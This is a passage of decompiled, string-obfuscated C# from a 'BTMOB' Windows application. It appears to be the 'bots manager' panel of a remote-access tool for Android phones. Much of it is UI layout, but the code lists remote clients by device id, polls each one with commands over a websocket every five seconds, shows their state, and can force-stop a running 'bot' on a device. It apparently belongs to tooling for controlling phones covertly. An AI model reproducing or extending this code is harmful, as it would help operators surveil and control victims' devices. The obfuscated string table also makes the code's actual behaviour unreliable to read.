		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(2, 2);
		this.Panel3.Name = EXGuarder._36602A67;
		this.Panel3.Padding = new System.Windows.Forms.Padding(10);
		this.Panel3.Size = new System.Drawing.Size(1632, 65);
		this.Panel3.TabIndex = 44;
		this.Panel4.Controls.Add(this.pinbtn);
		this.Panel4.Controls.Add(this.DrakeWidth_W1);
		this.Panel4.Controls.Add(this.minibtn);
		this.Panel4.Controls.Add(this.spl2);
		this.Panel4.Controls.Add(this.closbtn);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(432, 10);
		this.Panel4.Name = EXGuarder._6A5D2723;
		this.Panel4.Size = new System.Drawing.Size(1190, 28);
		this.Panel4.TabIndex = 2;
		this.pinbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pinbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.pinbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillPressColor = System.Drawing.Color.FromArgb(50, 50, 50);
		this.pinbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.Font = new System.Drawing.Font(EXGuarder._2D11553E, 12f);
		this.pinbtn.Location = new System.Drawing.Point(1059, 0);
		this.pinbtn.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.pinbtn.Name = EXGuarder._63111819;
		this.pinbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.pinbtn.RectColor = System.Drawing.Color.Gray;
		this.pinbtn.RectDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.pinbtn.RectHoverColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.pinbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.pinbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.pinbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.pinbtn.Size = new System.Drawing.Size(37, 28);
		this.pinbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pinbtn.Symbol = 57474;
		this.pinbtn.SymbolSize = 20;
		this.pinbtn.TabIndex = 41;
		this.DrakeWidth_W1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W1.Location = new System.Drawing.Point(1096, 0);
		this.DrakeWidth_W1.Name = EXGuarder._1D4C4759;
		this.DrakeWidth_W1.Size = new System.Drawing.Size(10, 28);
		this.DrakeWidth_W1.TabIndex = 43;
		this.minibtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minibtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.minibtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.minibtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minibtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minibtn.FillPressColor = System.Drawing.Color.FromArgb(50, 50, 50);
		this.minibtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minibtn.Font = new System.Drawing.Font(EXGuarder._2D11553E, 12f);
		this.minibtn.Location = new System.Drawing.Point(1106, 0);
		this.minibtn.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.minibtn.Name = EXGuarder._085E013B;
		this.minibtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.minibtn.RectColor = System.Drawing.Color.Gray;
		this.minibtn.RectDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.minibtn.RectHoverColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.minibtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.minibtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.minibtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.minibtn.Size = new System.Drawing.Size(37, 28);
		this.minibtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.minibtn.Symbol = 61526;
		this.minibtn.SymbolSize = 20;
		this.minibtn.TabIndex = 42;
		this.spl2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.spl2.Dock = System.Windows.Forms.DockStyle.Right;
		this.spl2.Location = new System.Drawing.Point(1143, 0);
		this.spl2.Name = EXGuarder._3B535A14;
		this.spl2.Size = new System.Drawing.Size(10, 28);
		this.spl2.TabIndex = 40;
		this.closbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.closbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.closbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillPressColor = System.Drawing.Color.FromArgb(50, 50, 50);
		this.closbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Font = new System.Drawing.Font(EXGuarder._2D11553E, 12f);
		this.closbtn.ForeColor = System.Drawing.Color.Red;
		this.closbtn.Location = new System.Drawing.Point(1153, 0);
		this.closbtn.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.closbtn.Name = EXGuarder._0E626848;
		this.closbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.closbtn.RectColor = System.Drawing.Color.Red;
		this.closbtn.RectDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectHoverColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.closbtn.Size = new System.Drawing.Size(37, 28);
		this.closbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.closbtn.Symbol = 61527;
		this.closbtn.SymbolSize = 20;
		this.closbtn.TabIndex = 39;
		this.bottitle.Dock = System.Windows.Forms.DockStyle.Left;
		this.bottitle.Font = new System.Drawing.Font(EXGuarder._2D11553E, 14f, System.Drawing.FontStyle.Bold);
		this.bottitle.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.bottitle.Location = new System.Drawing.Point(62, 10);
		this.bottitle.Name = EXGuarder._07031836;
		this.bottitle.Padding = new System.Windows.Forms.Padding(5);
		this.bottitle.Size = new System.Drawing.Size(370, 45);
		this.bottitle.TabIndex = 1;
		this.bottitle.Text = EXGuarder._531F0E69;
		this.bottitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Left;
		this.PictureBox1.Image = BTMOB.My.Resources.Resources.robot_filled2;
		this.PictureBox1.Location = new System.Drawing.Point(10, 10);
		this.PictureBox1.Name = EXGuarder._072A5667;
		this.PictureBox1.Size = new System.Drawing.Size(52, 45);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 0;
		this.PictureBox1.TabStop = false;
		this.DrakeWidth_W5.BackColor = System.Drawing.Color.Gray;
		this.DrakeWidth_W5.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W5.Location = new System.Drawing.Point(0, 2);
		this.DrakeWidth_W5.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W5.Name = EXGuarder._73064F0E;
		this.DrakeWidth_W5.Size = new System.Drawing.Size(2, 775);
		this.DrakeWidth_W5.TabIndex = 44;
		this.DrakeWidth_W8.BackColor = System.Drawing.Color.Gray;
		this.DrakeWidth_W8.Cursor = System.Windows.Forms.Cursors.SizeNS;
		this.DrakeWidth_W8.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W8.Location = new System.Drawing.Point(0, 777);
		this.DrakeWidth_W8.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W8.Name = EXGuarder._42275D0A;
		this.DrakeWidth_W8.Size = new System.Drawing.Size(1634, 2);
		this.DrakeWidth_W8.TabIndex = 44;
		this.DrakeWidth_W6.BackColor = System.Drawing.Color.Gray;
		this.DrakeWidth_W6.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W6.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W6.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W6.Name = EXGuarder._44474B4A;
		this.DrakeWidth_W6.Size = new System.Drawing.Size(1634, 2);
		this.DrakeWidth_W6.TabIndex = 44;
		this.DrakeWidth_W7.BackColor = System.Drawing.Color.Gray;
		this.DrakeWidth_W7.Cursor = System.Windows.Forms.Cursors.SizeWE;
		this.DrakeWidth_W7.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W7.Location = new System.Drawing.Point(1634, 0);
		this.DrakeWidth_W7.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W7.Name = EXGuarder._22167819;
		this.DrakeWidth_W7.Size = new System.Drawing.Size(2, 779);
		this.DrakeWidth_W7.TabIndex = 44;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1636, 779);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.DrakeWidth_W5);
		base.Controls.Add(this.DrakeWidth_W8);
		base.Controls.Add(this.DrakeWidth_W6);
		base.Controls.Add(this.DrakeWidth_W7);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._331F235F);
		base.Name = EXGuarder._726E4969;
		this.Text = EXGuarder._726E4969;
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.BotsView).EndInit();
		this.Panel5.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVC).EndInit();
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		base.ResumeLayout(false);
	}

	private async void BotsManager_Load(object sender, EventArgs e)
	{
		codes.SetDoubleBuffered(DGVC);
		DataGridView dGVC = DGVC;
		dGVC.EnableHeadersVisualStyles = false;
		dGVC.CellBorderStyle = DataGridViewCellBorderStyle.None;
		dGVC.RowHeadersVisible = false;
		dGVC.GridColor = Color.FromArgb(6, 10, 15);
		dGVC.BackgroundColor = Color.FromArgb(6, 10, 15);
		dGVC.DefaultCellStyle.BackColor = Color.FromArgb(6, 10, 15);
		dGVC.DefaultCellStyle.SelectionBackColor = Color.FromArgb(14, 22, 33);
		Opacity = 0.0;
		emptyimg = new Bitmap(1, 1);
		bottitle.Text = BTConst.botmgrstr;
		srchbtn.Text = BTConst.adrovewstr;
		Label2.Text = BTConst.actvclstr;
		string userDataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BTBOTSCACH");
		CoreWebView2Environment environment = await CoreWebView2Environment.CreateAsync(null, userDataFolder);
		await BotsView.EnsureCoreWebView2Async(environment);
		BotsView.NavigationCompleted += WebView_NavigationCompleted;
		string tempPath = Path.GetTempPath();
		string path = Path.Combine(tempPath, "btbots.html");
		File.WriteAllBytes(path, Resources.BTBOTS);
		string contents = File.ReadAllText(path).Replace("[LNG]", codes.locallanguage());
		File.WriteAllText(path, contents, Encoding.UTF8);
		BotsView.CoreWebView2.SetVirtualHostNameToFolderMapping(BTConst.myname, tempPath, CoreWebView2HostResourceAccessKind.Allow);
		BotsView.CoreWebView2.Navigate($"https://{BTConst.myname}/btbots.html");
		mybridge rawObject = new mybridge(this);
		BotsView.CoreWebView2.AddHostObjectToScript("mybridge", rawObject);
	}

	private void WebView_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
		loadclients();
		refresher.RunWorkerAsync();
		base.Opacity = 1.0;
	}

	private void loadclients()
	{
		if (listclients.Count <= 0)
		{
			return;
		}
		foreach (BTClient listclient in listclients)
		{
			try
			{
				int index = DGVC.Rows.Add(false, listclient.wallpaper, listclient.name, EXGuarder._2D134769, emptyimg);
				DataGridViewRow dataGridViewRow = DGVC.Rows[index];
				dataGridViewRow.Tag = listclient.mobid;
				dataGridViewRow.Cells[0].Tag = listclient.Serverins;
				dgvlink.Add(listclient.mobid, dataGridViewRow);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox(EXGuarder._4C313661 + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DGVC_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex >= 0 && e.ColumnIndex == checked(DGVC.Columns.Count - 1) && DGVC.Rows[e.RowIndex].Cells[4].Tag != null && Operators.ConditionalCompareObjectEqual(DGVC.Rows[e.RowIndex].Cells[4].Tag, EXGuarder._241B2974, TextCompare: false) && MyMsg.Show(BTConst.confirmstr, BTConst.frcstopbot, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._1F532965) == DialogResult.OK)
		{
			string text = Conversions.ToString(DGVC.Rows[e.RowIndex].Tag);
			ServersInfo serversInfo = (ServersInfo)DGVC.Rows[e.RowIndex].Cells[0].Tag;
			if (Operators.CompareString(text, EXGuarder._43644018, TextCompare: false) == 0)
			{
				BTAlerter.infos(EXGuarder._6476664B);
				return;
			}
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._45333A5B, EXGuarder._134F3109);
			dictionary.Add(EXGuarder._35407023, EXGuarder._190B0076);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, text, serversInfo.WSClient);
		}
	}

	private void DGVC_CellMouseEnter(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex >= 0)
		{
			if (e.ColumnIndex == checked(DGVC.Columns.Count - 1))
			{
				if (DGVC.Rows[e.RowIndex].Cells[4].Tag != null && Operators.ConditionalCompareObjectEqual(DGVC.Rows[e.RowIndex].Cells[4].Tag, EXGuarder._2C335D25, TextCompare: false))
				{
					DGVC.Cursor = Cursors.Hand;
				}
				else
				{
					DGVC.Cursor = Cursors.Default;
				}
			}
			else
			{
				DGVC.Cursor = Cursors.Default;
			}
		}
		else
		{
			DGVC.Cursor = Cursors.Default;
		}
	}

	private void DGVC_CellMouseLeave(object sender, DataGridViewCellEventArgs e)
	{
		DGVC.Cursor = Cursors.Default;
	}

	private void refresher_DoWork(object sender, DoWorkEventArgs e)
	{
		while (ialive)
		{
			try
			{
				Thread.Sleep(5000);
				if (base.IsDisposed)
				{
					break;
				}
				if (listclients.Count <= 0)
				{
					continue;
				}
				foreach (BTClient listclient in listclients)
				{
					try
					{
						if (base.IsDisposed | !ialive)
						{
							return;
						}
						if (!skiplist.Contains(listclient.mobid))
						{
							Dictionary<string, object> dictionary = new Dictionary<string, object>();
							dictionary.Add(EXGuarder._3076392C, EXGuarder._3805153B);
							dictionary.Add(EXGuarder._11286069, EXGuarder._4C272202);
							Dictionary<string, object> chatData = dictionary;
							BTEngine.commands(chatData, listclient.mobid, listclient.Serverins.WSClient);
							Thread.Sleep(1);
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						Interaction.MsgBox(EXGuarder._3E4A4D38 + ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeWidth_W7_MouseDown(object sender, MouseEventArgs e)
	{
		movX = true;
		Mx = Control.MousePosition.X;
		Sw = base.Width;
	}

	private void DrakeWidth_W7_MouseMove(object sender, MouseEventArgs e)
	{
		if (movX)
		{
			base.Width = checked(Control.MousePosition.X - Mx + Sw);
		}
	}

	private void DrakeWidth_W7_MouseUp(object sender, MouseEventArgs e)
	{
		movX = false;
	}

	private void DrakeWidth_W8_MouseDown(object sender, MouseEventArgs e)
	{
		movY = true;
		Myyy = Control.MousePosition.Y;
		Sh = base.Height;
	}

	private void DrakeWidth_W8_MouseMove(object sender, MouseEventArgs e)
	{
		if (movY)
		{
			base.Height = checked(Control.MousePosition.Y - Myyy + Sh);
		}
	}

	private void DrakeWidth_W8_MouseUp(object sender, MouseEventArgs e)
	{
		movY = false;
	}

	public void clientisoff(string mobid)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				clientisoff(mobid);
			}));
		}
		else if (dgvlink.ContainsKey(mobid) && !skiplist.Contains(mobid))
		{
			DataGridViewRow dataGridViewRow = dgvlink[mobid];
			dataGridViewRow.Tag = EXGuarder._1B015A52;
			dataGridViewRow.Cells[3].Value = EXGuarder._4A154341;
			skiplist.Add(mobid);
		}
	}

	public void updateclient(string mobid, string state, string lastactive)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				updateclient(mobid, state, lastactive);
			}));
			return;
		}
		if (skiplist.Contains(mobid))
		{
			skiplist.Remove(mobid);
		}
		if (!dgvlink.ContainsKey(mobid))
		{
			return;
		}
		DataGridViewRow dataGridViewRow = dgvlink[mobid];
		string left = state.ToUpper();
		if (Operators.CompareString(left, EXGuarder._4C572233, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._66082B62, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._0E1A4A13, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._44343F37, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._3D05535D, TextCompare: false) == 0)
						{
							dataGridViewRow.Cells[3].Style.ForeColor = Color.OrangeRed;
							dataGridViewRow.Cells[4].Value = emptyimg;
							dataGridViewRow.Cells[4].Tag = EXGuarder._03040F47;
						}
						else
						{
							dataGridViewRow.Cells[3].Style.ForeColor = Color.White;
							dataGridViewRow.Cells[4].Value = emptyimg;
							dataGridViewRow.Cells[4].Tag = EXGuarder._03040F47;
						}
					}
					else
					{
						dataGridViewRow.Cells[3].Style.ForeColor = Color.Red;
						dataGridViewRow.Cells[4].Value = emptyimg;
						dataGridViewRow.Cells[4].Tag = EXGuarder._03040F47;
					}
				}
				else
				{
					dataGridViewRow.Cells[3].Style.ForeColor = Color.Green;
					dataGridViewRow.Cells[4].Value = emptyimg;
					dataGridViewRow.Cells[4].Tag = EXGuarder._03040F47;
				}
			}
			else
			{
				dataGridViewRow.Cells[3].Style.ForeColor = Color.FromArgb(2, 176, 117);
				dataGridViewRow.Cells[4].Value = Resources.xstop;
				dataGridViewRow.Cells[4].Tag = EXGuarder._4A217664;
			}
		}
		else
		{
			dataGridViewRow.Cells[3].Style.ForeColor = Color.Gray;
			dataGridViewRow.Cells[4].Value = emptyimg;
			dataGridViewRow.Cells[4].Tag = EXGuarder._03040F47;
		}
		dataGridViewRow.Cells[3].Value = TranslateState(state);
		dataGridViewRow.Cells[3].ToolTipText = lastactive;
	}

	private void BotsManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		ialive = false;
		refresher.Dispose();
	}

	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void closbtn_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void pinbtn_Click(object sender, EventArgs e)
	{
		if (keepmeto)
		{
			pinbtn.ForeColor = Color.DeepSkyBlue;
			pinbtn.RectColor = Color.DeepSkyBlue;
			Nativz.SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = false;
		}
		else
		{
			pinbtn.ForeColor = Color.White;
			pinbtn.RectColor = Color.Gray;
			Nativz.SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = true;
		}
	}

	private void minibtn_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void srchbtn_Click(object sender, EventArgs e)
	{
		if (AV == null || AV.IsDisposed)
		{
			AV = new AndroidViewer();
			AV.FormClosed += [SpecialName] [DebuggerHidden] (object a0, FormClosedEventArgs a1) =>
			{
				_Lambda_0024__142_002D0();
			};
			AV.Show();
		}
		else
		{
			AV.BringToFront();
			AV.Focus();
		}
	}

	private string TranslateState(string state)
	{
		string left = codes.locallanguage();
		if (Operators.CompareString(left, EXGuarder._4B5F1333, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._4C496601, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._604D7731, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._58783A27, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._66360531, TextCompare: false) != 0)
						{
							if (Operators.CompareString(left, EXGuarder._11266212, TextCompare: false) == 0)
							{
								string left2 = state.ToUpper();
								if (Operators.CompareString(left2, EXGuarder._42695077, TextCompare: false) == 0)
								{
									return EXGuarder._456D1A0C;
								}
								if (Operators.CompareString(left2, EXGuarder._16320934, TextCompare: false) == 0)
								{
									return EXGuarder._22211C70;
								}
								if (Operators.CompareString(left2, EXGuarder._590E3E47, TextCompare: false) == 0)
								{
									return EXGuarder._00185309;
								}
								if (Operators.CompareString(left2, EXGuarder._250A5645, TextCompare: false) == 0)
								{
									return EXGuarder._6A492949;
								}
								if (Operators.CompareString(left2, EXGuarder._2F0D1D2C, TextCompare: false) == 0)
								{
									return EXGuarder._48662853;
								}
							}
							else
							{
								string left3 = state.ToUpper();
								if (Operators.CompareString(left3, EXGuarder._42695077, TextCompare: false) == 0)
								{
									return EXGuarder._2B531110;
								}
								if (Operators.CompareString(left3, EXGuarder._16320934, TextCompare: false) == 0)
								{
									return EXGuarder._44746D0F;
								}
								if (Operators.CompareString(left3, EXGuarder._590E3E47, TextCompare: false) == 0)
								{
									return EXGuarder._14004417;
								}
								if (Operators.CompareString(left3, EXGuarder._250A5645, TextCompare: false) == 0)
								{
									return EXGuarder._4E14005C;
								}
								if (Operators.CompareString(left3, EXGuarder._2F0D1D2C, TextCompare: false) == 0)
								{
									return EXGuarder._0B3A3601;
								}
							}
						}
						else
						{
							string left4 = state.ToUpper();
							if (Operators.CompareString(left4, EXGuarder._42695077, TextCompare: false) == 0)
							{
								return EXGuarder._2435183E;
							}
							if (Operators.CompareString(left4, EXGuarder._16320934, TextCompare: false) == 0)
							{
								return EXGuarder._01233D57;
							}
							if (Operators.CompareString(left4, EXGuarder._590E3E47, TextCompare: false) == 0)
							{
								return EXGuarder._672A5B1F;
							}
							if (Operators.CompareString(left4, EXGuarder._250A5645, TextCompare: false) == 0)
							{
								return EXGuarder._36360349;
							}
							if (Operators.CompareString(left4, EXGuarder._2F0D1D2C, TextCompare: false) == 0)
							{
								return EXGuarder._790E0366;
							}
						}
					}
					else
					{
						string left5 = state.ToUpper();
						if (Operators.CompareString(left5, EXGuarder._42695077, TextCompare: false) == 0)
						{
							return EXGuarder._0744700B;
						}
						if (Operators.CompareString(left5, EXGuarder._16320934, TextCompare: false) == 0)
						{
							return EXGuarder._251C262B;
						}
						if (Operators.CompareString(left5, EXGuarder._590E3E47, TextCompare: false) == 0)
						{
							return EXGuarder._5D5C2C2B;
						}
						if (Operators.CompareString(left5, EXGuarder._250A5645, TextCompare: false) == 0)
						{
							return EXGuarder._2B1A5554;
						}
						if (Operators.CompareString(left5, EXGuarder._2F0D1D2C, TextCompare: false) == 0)
						{
							return EXGuarder._4F501A16;
						}
					}
				}
				else
				{
					string left6 = state.ToUpper();
					if (Operators.CompareString(left6, EXGuarder._42695077, TextCompare: false) == 0)
					{
						return EXGuarder._1F263B42;
					}
					if (Operators.CompareString(left6, EXGuarder._16320934, TextCompare: false) == 0)
					{
						return EXGuarder._146D0E2A;
					}
					if (Operators.CompareString(left6, EXGuarder._590E3E47, TextCompare: false) == 0)
					{
						return EXGuarder._6E3B0C18;
					}
					if (Operators.CompareString(left6, EXGuarder._250A5645, TextCompare: false) == 0)
					{
						return EXGuarder._34380F32;
					}
					if (Operators.CompareString(left6, EXGuarder._2F0D1D2C, TextCompare: false) == 0)
					{
						return EXGuarder._09286204;
					}
				}
			}
			else
			{
				string left7 = state.ToUpper();
				if (Operators.CompareString(left7, EXGuarder._42695077, TextCompare: false) == 0)
				{
					return EXGuarder._77642A2A;
				}
				if (Operators.CompareString(left7, EXGuarder._16320934, TextCompare: false) == 0)
				{
					return EXGuarder._7579043A;
				}
				if (Operators.CompareString(left7, EXGuarder._590E3E47, TextCompare: false) == 0)
				{
					return EXGuarder._4D6B4010;
				}
				if (Operators.CompareString(left7, EXGuarder._250A5645, TextCompare: false) == 0)
				{
					return EXGuarder._486A3231;
				}
				if (Operators.CompareString(left7, EXGuarder._2F0D1D2C, TextCompare: false) == 0)
				{
					return EXGuarder._7939333F;
				}
			}
		}
		else
		{
			string left8 = state.ToUpper();
			if (Operators.CompareString(left8, EXGuarder._42695077, TextCompare: false) == 0)
			{
				return EXGuarder._1B087150;
			}
			if (Operators.CompareString(left8, EXGuarder._16320934, TextCompare: false) == 0)
			{
				return EXGuarder._71146B65;
			}
			if (Operators.CompareString(left8, EXGuarder._590E3E47, TextCompare: false) == 0)
			{
				return EXGuarder._2429386B;
			}
			if (Operators.CompareString(left8, EXGuarder._250A5645, TextCompare: false) == 0)
			{
				return EXGuarder._571B2419;
			}
			if (Operators.CompareString(left8, EXGuarder._2F0D1D2C, TextCompare: false) == 0)
			{
				return EXGuarder._2615196F;
			}
		}
		return state;
	}

	private void DGVPRIMB_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0 || (dataGridView.CurrentCell != null && e.RowIndex == dataGridView.CurrentCell.RowIndex && e.ColumnIndex == dataGridView.CurrentCell.ColumnIndex && dataGridView.CurrentCell.IsInEditMode))
		{
			return;
		}
		e.Handled = true;
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(0, -2);
		using (SolidBrush brush = new SolidBrush(Color.FromArgb(6, 10, 15)))
		{
			e.Graphics.FillRectangle(brush, e.CellBounds);
		}
		int radius = 15;
		GraphicsPath graphicsPath = null;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			if (columnIndex == 0)
			{
				DGVC.Rows[e.RowIndex].Cells[0].Style.Padding = new Padding(0);
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			Color color;
			Color color2;
			if (dataGridView.Rows[e.RowIndex].Selected)
			{
				color = Color.FromArgb(14, 22, 33);
				color2 = Color.FromArgb(2, 176, 117);
			}
			else
			{
				Color foreColor = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
				color2 = ((!foreColor.IsEmpty) ? foreColor : Color.FromArgb(145, 163, 182));
				color = Color.FromArgb(6, 10, 15);
			}
			using (SolidBrush brush2 = new SolidBrush(color))
			{
				using Pen pen = new Pen(color);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			DataGridViewColumn dataGridViewColumn = dataGridView.Columns[e.ColumnIndex];
			if (e.Value != null && e.Value is Image)
			{
				Image image = (Image)e.Value;
				Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
				e.Graphics.DrawImage(image, rect);
			}
			else if (dataGridViewColumn is DataGridViewCheckBoxColumn || e.Value is bool)
			{
				bool flag = false;
				if (e.Value != null && !Information.IsDBNull(RuntimeHelpers.GetObjectValue(e.Value)))
				{
					flag = Conversions.ToBoolean(e.Value);
				}
				int num2 = 14;
				Rectangle rect2 = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - num2) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - num2) / 2), num2, num2);
				using (Pen pen2 = new Pen(color2, 2f))
				{
					e.Graphics.DrawRectangle(pen2, rect2);
				}
				if (flag)
				{
					GraphicsPath graphicsPath2 = new GraphicsPath();
					graphicsPath2.AddLines(new Point[3]
					{
						new Point(rect2.Left + 3, rect2.Top + unchecked(num2 / 2)),
						new Point(rect2.Left + unchecked(num2 / 2) - 1, rect2.Bottom - 3),
